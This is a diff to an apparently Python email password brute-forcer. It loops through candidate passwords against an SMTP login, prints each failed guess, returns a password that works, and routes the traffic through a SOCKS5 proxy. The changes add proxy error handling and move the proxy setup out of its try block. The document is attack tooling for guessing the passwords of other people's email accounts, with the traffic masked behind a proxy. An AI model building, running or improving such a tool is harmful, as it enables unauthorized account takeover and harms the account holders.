@@ -144,7 +144,13 @@ class Email():
                         print("[-]There was an error connecting to the smtp server")
                         exit()
                     except smtplib.SMTPAuthenticationError:
-                        pass
+                        print("Password Not Found:", password)
+                    except socks.SOCKS5Error:
+                        print("[-]An error was generated when using the proxy.")
+                        break
+                    except socks.GeneralProxyError:
+                        print("[-]An error was generated when using the proxy.")
+                        break
             print("[+]Scanning completed")
             if(password_found):
                 return password
@@ -182,16 +188,9 @@ class Proxy(Email):
         self.__port = int(port)
 
     def start_proxy(self):
-        try:
-            print(f"[+]The server proxy {self.__proxy}:{self.__port} is running...")
-            socks.set_default_proxy(socks.SOCKS5, self.__proxy, self.__port)
-            socket.socket = socks.socksocket          
-        except socks.SOCKS5Error:
-            print("[-]An error was generated when using the proxy.")
-            pass
-        except socks.GeneralProxyError:
-            print("[-]An error was generated when using the proxy.")
-            pass
+        print(f"[+]The server proxy {self.__proxy}:{self.__port} is running...")
+        socks.set_default_proxy(socks.SOCKS5, self.__proxy, self.__port)
+        socket.socket = socks.socksocket          
         
 def main():
     if(sys.argv[1] == "-list" and sys.argv[3] == "-add"):
